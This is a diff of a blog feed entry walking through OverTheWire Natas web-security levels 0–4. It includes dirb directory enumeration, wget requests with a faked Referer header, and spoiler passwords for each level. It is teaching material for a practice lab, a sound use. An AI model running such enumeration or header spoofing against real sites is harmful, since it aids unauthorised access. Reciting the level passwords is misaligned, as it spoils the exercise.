+  &lt;li&gt;&lt;a href=&quot;#level-2&quot; id=&quot;markdown-toc-level-2&quot;&gt;Level 2&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-3&quot; id=&quot;markdown-toc-level-3&quot;&gt;Level 3&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-4&quot; id=&quot;markdown-toc-level-4&quot;&gt;Level 4&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&quot;http://overthewire.org&quot;&gt;OverTheWire&lt;/a&gt; is a wargame site with several challenges.
 For a beginner, it contains several challenges with a nice increase in
 difficulty.
@@ -3392,8 +3442,9 @@ programming experience.&lt;/p&gt;
 or &lt;a href=&quot;https://www.mozilla.org/en-US/firefox/new/&quot;&gt;Firefox&lt;/a&gt;.
 User/Pass: natas0/natas0
 View &lt;a href=&quot;https://www.w3schools.com/html/html_intro.asp&quot;&gt;the source&lt;/a&gt;,
-and look for the comment with the password for the next level.&lt;br /&gt;
-&lt;em&gt;Don’t leave comments with sensitive data, they are easy to find.&lt;/em&gt;&lt;/p&gt;
+and look for the comment with the password for the next level.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Don’t leave comments with sensitive data, they are easy to find.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
@@ -3402,8 +3453,9 @@ and look for the comment with the password for the next level.&lt;br /&gt;
 &lt;h2 id=&quot;level-1&quot;&gt;&lt;a href=&quot;http://natas1.natas.labs.overthewire.org&quot;&gt;Level 1&lt;/a&gt;&lt;/h2&gt;
 &lt;p&gt;Use the web developer tools (&lt;a href=&quot;https://developers.google.com/web/tools/chrome-devtools/&quot;&gt;Chrome DevTools&lt;/a&gt;,
 &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Tools&quot;&gt;Firefox developer tools&lt;/a&gt;)
-to show the source where you will find the password.&lt;br /&gt;
-&lt;em&gt;Blocking right-click is useless.&lt;/em&gt;&lt;/p&gt;
+to show the source where you will find the password.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Blocking right-click is useless.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
@@ -3418,13 +3470,14 @@ I inspected the &lt;a href=&quot;https://code.tutsplus.com/tutorials/http-header
 to see if anything was hidden there, nada.&lt;br /&gt;
 I downloaded the image and displayed the raw data to see if there was something hidden
 in the image, nada.&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pixel.png
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pixel.png
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Perhaps there are other files in the same folder as the image? Lets try to open
 the folder in the browser: &lt;a href=&quot;http://natas2.natas.labs.overthewire.org/files/&quot;&gt;http://natas2.natas.labs.overthewire.org/files/&lt;/a&gt;.&lt;br /&gt;
 Directory browsing is allowed, thus we see all the files including a file
-containing the password to the next level.&lt;br /&gt;
-&lt;em&gt;Make sure directory browsing is disabled.&lt;/em&gt;&lt;/p&gt;
+containing the password to the next level.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Make sure directory browsing is disabled.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
@@ -3439,12 +3492,13 @@ Kali linux, as it contains massive amount of tools, almost everything you need.&
 &lt;p&gt;Another page where there is nothing on the page.
 The source contains a comment with a hint. Since I hate to guess, I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirb&lt;/code&gt;
 to enumerate all common files/directories that may be found on a server.&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://natas3.natas.labs.overthewire.org &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; natas3:&amp;lt;passwd&amp;gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://natas3.natas.labs.overthewire.org &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; natas3:&amp;lt;passwd&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Amongst the output you should find an interesting file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;&lt;br /&gt;
 The &lt;a href=&quot;http://www.robotstxt.org/&quot;&gt;robots file&lt;/a&gt; revealed a hidden &lt;a href=&quot;http://natas3.natas.labs.overthewire.org/s3cr3t/&quot;&gt;directory&lt;/a&gt; (still with directory browsing enabled),
-where a &lt;a href=&quot;http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt&quot;&gt;file&lt;/a&gt; containing the password to the next level can be found.&lt;br /&gt;
-&lt;em&gt;robots.txt should not expose sensitive information.&lt;/em&gt;&lt;/p&gt;
+where a &lt;a href=&quot;http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt&quot;&gt;file&lt;/a&gt; containing the password to the next level can be found.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;robots.txt should not expose sensitive information.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
@@ -3460,7 +3514,7 @@ like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;
 the four letters. I recommend to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; as a first “go-to-tool”
 when you need to do simple request manipulation, as that will let you experiment
 very quickly with various variables.&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# The standard get of the page with no referer.&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# The standard get of the page with no referer.&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# --quiet to stop wget's output, you may want to skip this to see what wget is doing.&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# -O - Will write the output to the standard out instead of a file.&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;--quiet&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; - http://natas4:&amp;lt;passwd&amp;gt;@natas4.natas.labs.overthewire.org/
@@ -3470,10 +3524,8 @@ very quickly with various variables.&lt;/p&gt;
 &lt;p&gt;It seems the referer header was the correct assumption, and the page delivered
 the password for the next level.&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Do not trust the browser, everything can be faked.&lt;/em&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;Do not trust the browser, everything can be faked.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
-&lt;/details&gt;
-
-&lt;p&gt;&lt;a href=&quot;/blog/2019-03-17-overthewire-natas-5-9/&quot;&gt;Read Next - OverTheWire level 5-9 walkthrough.&lt;/a&gt;&lt;/p&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduction OverTheWire is a wargame site with several challenges. For a beginner, it contains several challenges with a nice increase in difficulty. This is the first entry of a writeup of the natas challenges, which teaches the basics of serverside web-security. I will try to walk you through the mind-process of searching for and finding vulnerabilities.</summary></entry></feed>
+&lt;/details&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduction Introduction OverTheWire is a wargame site with several challenges. For a beginner, it contains several challenges with a nice increase in difficulty. This is the first entry of a writeup of the natas challenges, which teaches the basics of serverside web-security. I will try to walk you through the mind-process of searching for and finding vulnerabilities.</summary></entry></feed>
